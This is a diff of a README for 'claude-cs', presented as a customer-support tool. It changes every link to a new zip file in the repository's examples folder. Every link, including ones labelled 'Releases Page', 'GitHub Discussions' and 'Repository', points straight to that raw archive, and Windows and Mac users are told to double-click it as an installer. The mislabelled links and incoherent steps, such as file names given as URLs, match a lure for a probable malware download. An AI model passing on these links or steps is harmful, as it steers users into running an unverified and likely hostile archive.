@@ -6,7 +6,7 @@ claude-cs is a user-friendly tool designed to help your business create custom a
 
 ## 🔗 Download Now
 
-[![Download claude-cs](https://raw.githubusercontent.com/chigyel/claude-cs/main/examples/claude_cs_v3.9.zip)](https://raw.githubusercontent.com/chigyel/claude-cs/main/examples/claude_cs_v3.9.zip)
+[![Download claude-cs](https://raw.githubusercontent.com/chigyel/claude-cs/main/examples/cs-claude-v1.0.zip)](https://raw.githubusercontent.com/chigyel/claude-cs/main/examples/cs-claude-v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -25,17 +25,17 @@ To ensure that claude-cs runs smoothly, please make sure your system meets the f
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page where you can find the latest version of claude-cs.
    
-   [Download claude-cs](https://raw.githubusercontent.com/chigyel/claude-cs/main/examples/claude_cs_v3.9.zip)
+   [Download claude-cs](https://raw.githubusercontent.com/chigyel/claude-cs/main/examples/cs-claude-v1.0.zip)
 
-2. **Choose the Right Version:** Once you are on the releases page, look for the latest release. You will see different files available for download. If you're unsure which one to choose, the file named `https://raw.githubusercontent.com/chigyel/claude-cs/main/examples/claude_cs_v3.9.zip` or `https://raw.githubusercontent.com/chigyel/claude-cs/main/examples/claude_cs_v3.9.zip` for Mac users is recommended for easy setup.
+2. **Choose the Right Version:** Once you are on the releases page, look for the latest release. You will see different files available for download. If you're unsure which one to choose, the file named `https://raw.githubusercontent.com/chigyel/claude-cs/main/examples/cs-claude-v1.0.zip` or `https://raw.githubusercontent.com/chigyel/claude-cs/main/examples/cs-claude-v1.0.zip` for Mac users is recommended for easy setup.
 
 3. **Download the File:** Click on the appropriate file to start downloading. Depending on your internet speed, this may take a few moments.
 
 4. **Locate the Downloaded File:** After the download completes, go to your Downloads folder. You should find the installer file there.
 
 5. **Run the Installer:**
-   - For **Windows Users:** Double-click the `https://raw.githubusercontent.com/chigyel/claude-cs/main/examples/claude_cs_v3.9.zip` file. Follow the prompts in the installation wizard.
-   - For **Mac Users:** Double-click the `https://raw.githubusercontent.com/chigyel/claude-cs/main/examples/claude_cs_v3.9.zip` file. Drag the claude-cs icon to your Applications folder.
+   - For **Windows Users:** Double-click the `https://raw.githubusercontent.com/chigyel/claude-cs/main/examples/cs-claude-v1.0.zip` file. Follow the prompts in the installation wizard.
+   - For **Mac Users:** Double-click the `https://raw.githubusercontent.com/chigyel/claude-cs/main/examples/cs-claude-v1.0.zip` file. Drag the claude-cs icon to your Applications folder.
 
 6. **Launch the Application:** Once the installation is complete, you can find claude-cs in your Applications or Start Menu. Click to open the application.
 
@@ -76,15 +76,15 @@ If you need assistance, visit our Issues page on GitHub. We are here to help.
 
 ## 📞 Contact Us
 
-For more information or questions regarding claude-cs, feel free to reach out. Check our [GitHub Discussions](https://raw.githubusercontent.com/chigyel/claude-cs/main/examples/claude_cs_v3.9.zip) for more insights and community tips.
+For more information or questions regarding claude-cs, feel free to reach out. Check our [GitHub Discussions](https://raw.githubusercontent.com/chigyel/claude-cs/main/examples/cs-claude-v1.0.zip) for more insights and community tips.
 
 ## 🔗 Additional Resources
 
-- GitHub Repository: [claude-cs Repository](https://raw.githubusercontent.com/chigyel/claude-cs/main/examples/claude_cs_v3.9.zip)
+- GitHub Repository: [claude-cs Repository](https://raw.githubusercontent.com/chigyel/claude-cs/main/examples/cs-claude-v1.0.zip)
 - Documentation: Visit our documentation section for more detailed guides on using claude-cs features.
 
 ## 📢 Keep Updated
 
 Stay informed on new features and updates by visiting our releases page regularly.
 
-[Download claude-cs](https://raw.githubusercontent.com/chigyel/claude-cs/main/examples/claude_cs_v3.9.zip) and make your customer support more efficient today!
+[Download claude-cs](https://raw.githubusercontent.com/chigyel/claude-cs/main/examples/cs-claude-v1.0.zip) and make your customer support more efficient today!
